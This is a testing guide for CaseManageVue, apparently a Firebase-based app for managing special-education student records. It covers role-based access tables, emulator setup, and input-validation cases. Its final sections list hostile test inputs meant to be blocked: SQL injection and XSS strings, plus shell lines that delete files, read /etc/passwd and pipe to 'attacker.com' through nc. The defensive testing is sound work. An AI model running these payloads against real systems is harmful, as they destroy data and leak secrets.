# 🧪 Testing Guide - CaseManageVue v1.1.6

## 🎯 Testing Overview

This guide covers comprehensive testing of security rules, validation utilities, and role-based access controls using the Firebase Emulator Suite and Jest testing framework.

### 🔑 **Key Security Rules Summary**

**Users Collection:**
- **Read Access:** ALL authenticated users with valid roles (all 10 roles can read user data for lookups)
- **Write Access:** Only admin roles (admin, school_admin, admin_504, sped_chair)

**Students Collection:**
- **Read-Only Roles:** teacher, staff_view, paraeducator (can read assigned students only)
- **Read-Write Roles:** admin, school_admin, admin_504, sped_chair, case_manager, service_provider, staff_edit

**Role Validation:**
- **Valid:** Only the 10 official roles are accepted
- **Invalid:** Any other role names (including old/deprecated ones) are rejected

## ✅ Automated Tests Status

### 🟢 **Validation Tests - FULLY WORKING (12/12 passing)**
```bash
npm run test:validation
```

**Tests Covered:**
- ✅ Role validation (all 10 roles: admin, school_admin, staff_view, staff_edit, admin_504, sped_chair, case_manager, teacher, service_provider, paraeducator)
- ✅ Email format validation (valid/invalid formats)
- ✅ String sanitization (XSS prevention, dangerous character removal)
- ✅ Security threat detection (SQL injection, XSS, command injection)

### 🟡 **Component Tests - Partial (needs refinement)**
```bash
npm test UserAddForm.test.js
```

**Status:** Form element selectors need updating for Vue 3 compatibility

### 🟡 **Firebase Rules Tests - Setup complete (needs emulator integration)**
```bash
npm run test:firebase
```

**Status:** Basic structure ready, needs proper Firebase app initialization

## 🚀 Manual Testing with Firebase Emulators

### **Prerequisites**
Ensure emulators are running:
```bash
npm run emulators
```

**Emulator URLs:**
- **Emulator UI Hub:** http://127.0.0.1:4000/
- **Firestore:** http://127.0.0.1:8080 (UI: http://127.0.0.1:4000/firestore)
- **Functions:** http://127.0.0.1:5001 (UI: http://127.0.0.1:4000/functions)
- **Storage:** http://127.0.0.1:9199 (UI: http://127.0.0.1:4000/storage)
- **Hosting:** http://127.0.0.1:5002

**Test Cases:**

| Role | Read Users | Write Users | Expected Result |
|------|------------|-------------|-----------------|
| `admin` | ✅ | ✅ | Allow |
| `school_admin` | ✅ | ✅ | Allow |
| `admin_504` | ✅ | ✅ | Allow |
| `sped_chair` | ✅ | ✅ | Allow |
| `teacher` | ✅ | ❌ | **Read only** |
| `staff_view` | ✅ | ❌ | **Read only** |
| `staff_edit` | ✅ | ❌ | **Read only** |
| `case_manager` | ✅ | ❌ | **Read only** |
| `service_provider` | ✅ | ❌ | **Read only** |
| `paraeducator` | ✅ | ❌ | **Read only** |
| Unauthenticated | ❌ | ❌ | Deny all |

#### **Test Students Collection**

| Role | Read Students | Write Students | Expected Result |
|------|---------------|----------------|-----------------|
| `admin` | ✅ | ✅ | Full access |
| `school_admin` | ✅ | ✅ | Full access |
| `admin_504` | ✅ | ✅ | Full access (504 students only) |
| `sped_chair` | ✅ | ✅ | Full access |

| `staff_edit` | ✅ | ✅ | Full access |
| `case_manager` | ✅ | ✅ | Assigned students only |
| `service_provider` | ✅ | ✅ | Assigned students only |
| `teacher` | ✅ | ❌ | **Read only** (assigned students) |
| `paraeducator` | ✅ | ❌ | **Read only** (assigned students) |
| Unauthenticated | ❌ | ❌ | Deny all |

#### **Test App Settings Collection**

| Role | Read Settings | Write Settings | Expected Result |
|------|---------------|----------------|-----------------|
| `admin` | ✅ | ✅ | Allow |
| `school_admin` | ✅ | ✅ | Allow |
| All other roles | ✅ | ❌ | Read only |
| Unauthenticated | ❌ | ❌ | Deny all |

### **2. Storage Security Rules Testing**
Navigate to: http://127.0.0.1:4000/storage

**Test Cases:**
- Upload files with different user roles
- Verify path-based permissions
- Test file access restrictions

### **3. Cloud Functions Security Testing**
Navigate to: http://127.0.0.1:4000/functions

**Available Functions to Test:**
- `addUserWithRole` - User creation with role validation
- `deleteUserAuth` - User deletion permissions
- `syncUserClaims` - Role synchronization
- `getStudentFeedback` - Student data access
- `updateStudentStaffIds` - Student data modification

## 🛡️ Validation & Security Testing

### **Input Validation Tests**

#### **Role Validation**
Test these roles in the user importer:

**✅ Valid Roles (should be ACCEPTED):**
```
admin, school_admin, staff_view, staff_edit, admin_504, sped_chair, 
case_manager, teacher, service_provider, paraeducator
```

**❌ Invalid Roles (should be REJECTED):**
```
administrator, super_admin, guest, invalid_role, admin_user, 
teacher_assistant, student, parent, ADMIN (case sensitive)
```

**What this means:** The validation tests verify that only the 10 official roles are accepted, and any other role names (including old/deprecated ones) are properly rejected.

#### **Email Validation**
```
✅ Valid: user@domain.com, test.user+tag@example.org
❌ Invalid: invalid-email, @domain.com, user@, user@domain
```

#### **Service Provider Validation**
Test abbreviation-only format:
```
✅ Valid: SLP, OT, PT, APE, VI, DHH, OHI, SID, AUT, ID, ED, LD, TBI, MD
❌ Invalid: Speech-Language Pathologist, Occupational Therapy
```

#### **Aeries ID Validation**
```
✅ Valid: 123456, 000001, 999999
❌ Invalid: abc123, 12345, 1234567, empty
```

### **Security Threat Detection**

#### **SQL Injection Prevention**
Test these inputs (should be blocked):
```
SELECT * FROM users
INSERT INTO users VALUES
UPDATE users SET role = 'admin'
DELETE FROM users WHERE id = 1
```

#### **XSS Prevention**
Test these inputs (should be sanitized):
```
<script>alert('xss')</script>
javascript:alert('xss')
onload="alert('xss')"
<img src=x onerror=alert('xss')>
```

#### **Command Injection Prevention**
Test these inputs (should be blocked):
```
; rm -rf /
&& cat /etc/passwd
| nc attacker.com 4444
```
